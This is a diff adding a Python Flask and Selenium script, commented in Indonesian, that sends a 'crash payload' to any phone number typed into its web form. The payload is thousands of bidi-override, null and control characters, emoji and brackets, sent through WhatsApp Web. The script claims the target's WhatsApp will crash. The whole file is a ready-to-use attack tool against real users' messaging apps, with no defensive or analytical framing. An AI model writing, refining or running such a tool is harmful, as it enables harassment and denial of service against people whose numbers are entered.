@@ -1,0 +1,95 @@
+#!/usr/bin/env python3
+# [KOMANDO HITAM - CRASH WHATSAPP MASS DRIVER]
+
+import time
+import re
+from flask import Flask, request, render_template_string
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.chrome.options import Options
+
+app = Flask(__name__)
+driver = None
+
+# ========== PAYLOAD GENERATOR (SAMA SEPERTI HTML) ==========
+def generate_crash_payload():
+    rtl = '\u202E'
+    ltr = '\u202D'
+    pop = '\u202C'
+    nullc = '\u0000'
+    sep = '\u001F'
+    payload = (rtl + ltr + pop + nullc + sep) * 3000
+    payload += '💀' * 500 + '\u200D' * 300 + '☠️' * 500
+    payload += '‮' * 2000 + '‬' * 2000
+    payload += '[[' * 1500 + ']]' * 1500
+    return payload
+
+# ========== SETUP CHROME DRIVER ==========
+def init_driver():
+    chrome_options = Options()
+    chrome_options.add_argument("--disable-notifications")
+    chrome_options.add_argument("--mute-audio")
+    # chrome_options.add_argument("--headless")  # nonaktifkan headless agar bisa scan QR
+    driver = webdriver.Chrome(options=chrome_options)
+    driver.get("https://web.whatsapp.com")
+    return driver
+
+# ========== KIRIM PESAN KE NOMOR ==========
+def send_crash_message(phone_number):
+    global driver
+    if driver is None:
+        driver = init_driver()
+        time.sleep(20)  # waktu scan QR manual
+    
+    # Format nomor (hilangkan '+', tambahkan @c.us)
+    clean_num = re.sub(r'\D', '', phone_number)
+    if not clean_num.endswith('@c.us'):
+        target = f"{clean_num}@c.us"
+    else:
+        target = clean_num
+    
+    # Buka chat
+    driver.get(f"https://web.whatsapp.com/send?phone={clean_num}")
+    time.sleep(7)
+    
+    # Cari kotak pesan
+    try:
+        input_box = driver.find_element(By.XPATH, '//div[@contenteditable="true"][@data-tab="10"]')
+        payload = generate_crash_payload()
+        input_box.send_keys(payload)
+        time.sleep(1)
+        input_box.send_keys(Keys.ENTER)
+        return "Payload terkirim. WhatsApp target akan crash dalam hitungan detik."
+    except Exception as e:
+        return f"Gagal: {str(e)}"
+
+# ========== WEB INTERFACE ==========
+HTML_FORM = '''
+<!DOCTYPE html>
+<html>
+<head><title>KOMANDO HITAM - Crash Server</title></head>
+<body style="background:black;color:red;font-family:monospace;text-align:center;">
+<h1>💀 WHATSAPP CRASH CONTROLLER</h1>
+<form method="POST">
+    <input type="text" name="number" placeholder="+62xxxxxxxxxx" required style="padding:10px;width:250px;">
+    <button type="submit" style="background:red;color:white;padding:10px;">EKSEKUSI</button>
+</form>
+<p style="color:lime;">{{msg}}</p>
+</body>
+</html>
+'''
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    msg = ""
+    if request.method == 'POST':
+        number = request.form['number']
+        result = send_crash_message(number)
+        msg = result
+    return render_template_string(HTML_FORM, msg=msg)
+
+if __name__ == '__main__':
+    print("[KOMANDO] Jalankan server, lalu buka http://localhost:5000")
+    print("[KOMANDO] Pastikan ChromeDriver terinstal dan path sudah benar")
+    app.run(host='0.0.0.0', port=5000, debug=False)
